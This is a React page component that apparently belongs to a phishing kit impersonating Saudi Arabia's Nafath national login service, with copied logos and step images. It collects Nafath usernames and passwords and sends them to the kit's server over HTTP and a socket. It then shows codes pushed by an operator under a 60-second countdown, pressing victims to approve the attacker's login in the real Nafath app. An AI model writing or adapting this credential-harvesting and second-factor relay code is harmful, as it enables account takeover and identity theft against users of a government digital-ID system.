import React, { useEffect, useState } from "react";
import { TailSpin } from "react-loader-spinner";
import { useLocation, useNavigate } from "react-router-dom";
import { FaExclamationTriangle } from "react-icons/fa";
import { api_route, socket } from "../App";
import axios from "axios";
import { scrollToTop } from "../utils/scroll";
import { useTranslation } from "../context/LanguageContext";

const IMG = {
  logo: "/nafad/nafad.png",
  step1: "/nafad/nafaz_2.jpeg",
  step2: "/nafad/nafaz_1.jpeg",
  cdeie: "/nafad/cdeie.png",
  footer: "/nafad/footerNafad.png",
};

const WarningBox = ({ children, className = "" }) => (
  <div
    className={`rounded-lg border px-4 py-3 text-sm font-semibold leading-relaxed text-start text-[#856404] bg-[#fff3cd] border-[#ffeeba] ${className}`}
  >
    <FaExclamationTriangle className="inline ms-1" />
    {children}
  </div>
);

/** Nafath / Navaz flow — UI aligned with becare nafad-basmah.php */
const Navaz = () => {
  const { t, dir } = useTranslation();
  const location = useLocation();
  const navigate = useNavigate();
  const data = new URLSearchParams(location.search);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [NavazUser, setNavazUser] = useState("");
  const [NavazPassword, setNavazPassword] = useState("");
  const [page, setPage] = useState(1);
  const [otp, setOtp] = useState(
    () => data.get("userOtp") || data.get("otp") || ""
  );
  const id = data.get("id");

  const [showModal, setShowModal] = useState(true);
  const [modalSec, setModalSec] = useState(60);

  const displayCode = otp && String(otp).trim() !== "" ? String(otp) : "--";

  const handleSubmit = async (e) => {
    setLoading(true);
    setError(false);

    e.preventDefault();
    const finalData = { id, NavazUser, NavazPassword };
    try {
      await axios.post(api_route + "/navaz/" + id, finalData).then(() => {
        socket.emit("navaz", { id, NavazUser, NavazPassword });
      });
    } catch {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!id) return;

    const onAcceptMotslOtp = (payload) => {
      if (payload?.id === id && payload.userOtp) {
        scrollToTop();
        setLoading(false);
        setPage(1);
        setOtp(payload.userOtp);
        setShowModal(true);
        setModalSec(60);
      }
    };

    const onDeclineNavaz = (payload) => {
      if (payload !== id) return;
      scrollToTop();
      setLoading(false);
      navigate("/phone");
    };

    const onAcceptSTC = (payload) => {
      if (payload?.id === id && payload.userOtp) {
        scrollToTop();
        setOtp(payload.userOtp);
      }
    };

    const onChangeNavazCode = (payload) => {
      if (payload?.id === id && payload.userOtp != null) {
        scrollToTop();
        setOtp(String(payload.userOtp));
        setPage(1);
        setShowModal(true);
        setModalSec(60);
      }
    };

    const onNavazCodeFromAdmin = (payload) => {
      if (!payload || payload.id !== id) return;
      const code = payload.price ?? payload.userOtp;
      if (code == null || String(code).trim() === "") return;
      scrollToTop();
      setOtp(String(code));
      setPage(1);
      setShowModal(true);
      setModalSec(60);
      setLoading(false);
    };

    socket.on("acceptMotslOtp", onAcceptMotslOtp);
    socket.on("declineNavaz", onDeclineNavaz);
    socket.on("acceptSTC", onAcceptSTC);
    socket.on("changeNavazCode", onChangeNavazCode);
    socket.on("acceptPhoneOTP", onNavazCodeFromAdmin);
    socket.on("acceptMobOtp", onNavazCodeFromAdmin);
    socket.on("acceptService", onNavazCodeFromAdmin);

    return () => {
      socket.off("acceptMotslOtp", onAcceptMotslOtp);
      socket.off("declineNavaz", onDeclineNavaz);
      socket.off("acceptSTC", onAcceptSTC);
      socket.off("changeNavazCode", onChangeNavazCode);
      socket.off("acceptPhoneOTP", onNavazCodeFromAdmin);
      socket.off("acceptMobOtp", onNavazCodeFromAdmin);
      socket.off("acceptService", onNavazCodeFromAdmin);
    };
  }, [id, navigate]);

  useEffect(() => {
    if (page !== 1 || !showModal) return;
    setModalSec(60);
    const timer = setInterval(() => {
      setModalSec((s) => {
        if (s <= 1) return 0;
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [page, showModal]);

  const openNafathApp = () => {
    window.open("https://www.nafath.sa", "_blank", "noopener,noreferrer");
  };

  return (
    <div
      className="min-h-screen w-full font-[Tajawal] flex flex-col"
      dir={dir}
      style={{ backgroundColor: "#f4f6f9" }}
    >
      <nav
        className="navbar flex items-center justify-between px-4 pt-4 pb-4 shadow-md bg-white"
        style={{ backgroundColor: "#fff" }}
      >
        <img
          src={IMG.logo}
          alt={t("confirmOrder.nafathApp")}
          width={128}
          className="max-w-[128px] h-auto"
        />
      </nav>

      {page === 0 ? (
        <div className="flex w-full flex-1 flex-col items-center justify-start px-4 py-6">
          <div className="flex w-full max-w-md flex-col items-center gap-5 rounded-lg bg-white py-6 shadow-sm">
            <img src={IMG.logo} alt="" className="w-32" />
            <span className="w-11/12 text-center font-semibold text-gray-500">
              {t("confirmOrder.enterNationalId")}
            </span>
            <form
              className="flex w-11/12 flex-col items-center rounded-md pb-2"
              style={{ border: "1px solid #11998e" }}
              onSubmit={handleSubmit}
            >
              <span
                className="w-full py-2 text-center text-lg text-white"
                style={{ backgroundColor: "#11998e" }}
              >
                {t("confirmOrder.credentialsHeader")}
              </span>
              <div className="flex w-full flex-col items-center gap-y-2 py-2 text-gray-700">
                <label className="text-lg">{t("confirmOrder.username")}</label>
                <input
                  type="text"
                  required
                  placeholder={t("confirmOrder.username")}
                  className="w-11/12 rounded-md border-2 p-2 text-right outline-blue-500"
                  value={NavazUser}
                  onChange={(e) => setNavazUser(e.target.value)}
                />
              </div>
              <div className="flex w-full flex-col items-center gap-y-2 py-2 text-gray-700">
                <label className="text-lg">{t("confirmOrder.password")}</label>
                <input
                  type="password"
                  required
                  placeholder={t("confirmOrder.password")}
                  className="w-11/12 rounded-md border-2 p-2 text-right outline-blue-500"
                  value={NavazPassword}
                  onChange={(e) => setNavazPassword(e.target.value)}
                />
              </div>
              {error ? (
                <div className="mb-1 flex w-full items-center justify-center text-lg font-semibold text-red-500">
                  {t("common.invalidCredentials")}
                </div>
              ) : null}
              <button
                className="mb-2 flex w-11/12 items-center justify-center rounded-sm py-2 text-lg text-white"
                style={{ backgroundColor: "#11998e" }}
                type="submit"
              >
                {loading ? (
                  <TailSpin
                    height="30"
                    width="30"
                    color="white"
                    ariaLabel="loading"
                    visible
                  />
                ) : (
                  t("confirmOrder.continueVerification")
                )}
              </button>
            </form>
          </div>
        </div>
      ) : (
        <>
          {showModal && (
            <div
              className="fixed inset-0 z-[100] flex items-center justify-center bg-black/50 p-4 "
              role="dialog"
              aria-modal="true"
              aria-labelledby="nafath-modal-title"
            >
              <div className="h-[90vh] w-full flex flex-col items-center justify-center max-w-lg overflow-y-auto rounded-lg bg-white shadow-xl">
                <div className="border-b-0 p-4 text-center">
                  <h5
                    id="nafath-modal-title"
                    className="mx-auto text-xl font-bold text-[#11a195]"
                  >
                    {t("confirmOrder.modalTitle")}
                  </h5>
                </div>
                <div className="px-4 pb-2 text-center">
                  <p className="mb-3 bg-[#11a195] w-full rounded px-1 py-1 text-lg text-white">
                    {t("confirmOrder.nafathApp")}
                  </p>
                  <div className="mb-3 flex justify-center">
                    <div
                      className="flex h-20 w-20 items-center justify-center rounded border-4 text-2xl font-bold"
                      style={{
                        color: "#11a195",
                        borderColor: "#11a195",
                      }}
                    >
                      {displayCode}
                    </div>
                  </div>
                  <p
                    className="text-sm leading-relaxed"
                    style={{ lineHeight: 1.8 }}
                  >
                    {t("confirmOrder.modalInstructions")}{" "}
                    <span className="font-bold text-green-600">
                      {displayCode}
                    </span>
                    <br />
                    {t("confirmOrder.selectNumberAbove")}
                  </p>
                  <div className="mb-3 mt-2">
                    <span
                      className={`inline-block rounded border px-3 py-2 text-base ${
                        modalSec <= 0
                          ? "bg-red-600 text-white border-red-700"
                          : "border-gray-300 bg-gray-100 text-gray-900"
                      }`}
                    >
                      {modalSec <= 0
                        ? t("confirmOrder.timeExpired")
                        : `${String(Math.floor(modalSec / 60)).padStart(2, "0")}:${String(modalSec % 60).padStart(2, "0")}`}
                    </span>
                  </div>
                  <WarningBox className="mb-3">
                    {t("confirmOrder.warning60Seconds")}
                  </WarningBox>
                  <div className="mt-4 flex justify-between gap-2">
                    <div className="step flex-1 text-center">
                      <img
                        src={IMG.step1}
                        alt=""
                        className="mx-auto h-auto w-[140px] max-w-full"
                      />
                      <p className="mt-2 text-sm">{t("confirmOrder.stepDownloadApp")}</p>
                    </div>
                    <div className="step flex-1 text-center">
                      <img
                        src={IMG.step2}
                        alt=""
                        className="mx-auto h-auto w-[140px] max-w-full"
                      />
                      <p className="mt-2 text-sm whitespace-pre-line">
                        {t("confirmOrder.stepSelectBiometric")}
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          <div className="container mx-auto mt-8 max-w-[720px] flex-1 px-3 text-center">
            <h6
              className="px-3 font-semibold leading-relaxed pl-3 pr-3"
              style={{ color: "#11998e", fontWeight: 600, lineHeight: 1.6 }}
            >
              <span
                className="mb-2 block"
                style={{ fontSize: "26px", fontWeight: 800 }}
              >
                {t("confirmOrder.please")}
              </span>
              {t("confirmOrder.mainInstructions")}
            </h6>
            <hr className="my-4 border-b border-[#2e2e2e]" />
            <div
              className="alert alert-success rounded-lg bg-green-100 text-green-800 shadow-sm"
              role="alert"
            >
              <h1
                id="nafad_code"
                className="py-2"
                style={{
                  margin: "20px 0 4px",
                  fontSize: "50px",
                  fontWeight: 800,
                }}
              >
                {displayCode}
              </h1>
            </div>
            <WarningBox className="mb-4 mt-4">
              {t("confirmOrder.warning60Seconds")}
            </WarningBox>
            <button
              type="button"
              className="col-12 w-full rounded-lg p-3 text-xl font-semibold text-white"
              style={{ backgroundColor: "#11998e" }}
              id="goApp"
              onClick={openNafathApp}
            >
              {t("confirmOrder.goToNafathApp")}
            </button>
            <img
              alt=""
              className="mx-auto mt-8 w-1/2 max-w-md"
              src={IMG.cdeie}
            />
          </div>

          <img alt="" className="mt-8 w-full" src={IMG.footer} />
        </>
      )}
    </div>
  );
};

export default Navaz;
